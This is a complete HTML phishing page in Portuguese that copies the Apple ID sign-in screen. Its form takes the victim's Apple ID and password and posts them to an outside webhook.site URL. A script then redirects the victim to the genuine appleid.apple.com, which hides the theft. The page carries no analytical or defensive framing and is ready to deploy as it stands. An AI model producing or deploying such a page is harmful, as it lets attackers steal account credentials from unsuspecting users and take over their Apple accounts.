<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Iniciar sessão - Apple ID</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      background-color: #f5f5f7;
      margin: 0;
      padding: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .container {
      background: white;
      padding: 40px;
      border-radius: 20px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      max-width: 320px;
      width: 100%;
    }
    h2 {
      text-align: center;
      margin-bottom: 24px;
      font-size: 20px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #0071e3;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    button:hover {
      background-color: #005bb5;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Iniciar sessão com Apple ID</h2>
    <form action="https://webhook.site/e9026c1f-9cde-4e6c-9d5d-bc2eb5f83418" method="POST" id="loginForm">
      <input type="text" name="apple_id" placeholder="Apple ID" required>
      <input type="password" name="password" placeholder="Senha" required>
      <button type="submit">Entrar</button>
    </form>
  </div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function () {
      setTimeout(function () {
        window.location.href = "https://appleid.apple.com/";
      }, 500); // Redireciona após 0,5s
    });
  </script>
</body>
</html>
